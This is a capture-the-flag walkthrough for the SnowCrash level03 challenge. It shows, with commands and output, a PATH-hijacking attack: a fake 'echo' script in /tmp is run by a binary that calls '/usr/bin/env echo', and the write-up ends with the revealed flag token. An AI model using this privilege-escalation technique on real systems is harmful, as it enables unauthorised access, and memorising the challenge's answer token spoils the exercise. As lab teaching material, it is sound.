# 🧊 SnowCrash - Level03 Walkthrough

## Level: 03

**Objective:** Exploit the program `level03` to retrieve the flag using `getflag`.

### 🧩 Step-by-step Solution

**1. List the files**

We start by listing the contents of the home directory:

```bash
ls
level03
```

There is a single executable file named `level03`.

**2. Inspect the binary for clues**

First we run the binary to check what it do:
```bash
./level03
Exploit me
```

Use the `strings` command to examine printable characters in the binary:

```bash
strings level03 | grep "Exploit me"
/usr/bin/env echo Exploit me
```

This tells us the program runs:

```bash
/usr/bin/env echo Exploit me
```

That means it uses `env` to find and run `echo`, which we can exploit by overriding the `PATH`.

**3. Prepare a fake echo command**

- Create a malicious `echo` script in `/tmp`:

```bash
cd /tmp
echo '/bin/getflag' > echo
chmod 777 echo
```

- Confirm it’s created:

```bash
ls -la echo
-rwxrwxrwx 1 level03 level03 13 Jun 13 21:24 echo
```

**4. Override the `PATH` environment variable**

Prepend `/tmp `to the `PATH` so our fake `echo` is executed instead of the real one:

```bash
export PATH=/tmp:$PATH
printenv | grep PATH
```

✅ Output:

```bash
PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```

**5. Run the vulnerable binary**

Execute the `level03` binary:

```bash
./level03
```

✅ Output:

```bash
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

**🔓 Successfully moved to level04!**